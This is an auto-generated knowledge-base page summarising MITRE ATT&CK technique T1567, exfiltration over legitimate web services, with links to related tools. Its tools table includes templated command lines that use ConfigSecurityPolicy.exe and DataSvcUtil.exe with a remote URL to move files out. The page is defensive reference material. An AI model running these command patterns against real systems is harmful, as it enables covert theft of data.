---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1567 - Exfiltration Over Web Service

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1567` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.

Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [ConfigSecurityPolicy.exe](../../tools/windows/configsecuritypolicy.exe.md) | explicit | source | Command metadata lists T1567: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL} |
| [DataSvcUtil.exe](../../tools/windows/datasvcutil.exe.md) | explicit | source | Command metadata lists T1567: DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL} |
| [ngrok](../../tools/unknown/ngrok.md) | explicit | source | [ngrok](https://attack.mitre.org/software/S0508) has been used by threat actors to configure servers for data exfiltration.(Citation: MalwareBytes Ngrok February 2020) |

## Source Verification

[source record](../../sources/mitre/exfiltration-over-web-service.md)

## Evidence Excerpt

```text
created: '2020-03-09T12:51:45.570Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: 'Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary
command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover
due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules
may also already exist to permit traffic to these services.
Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.'
external_references:
```
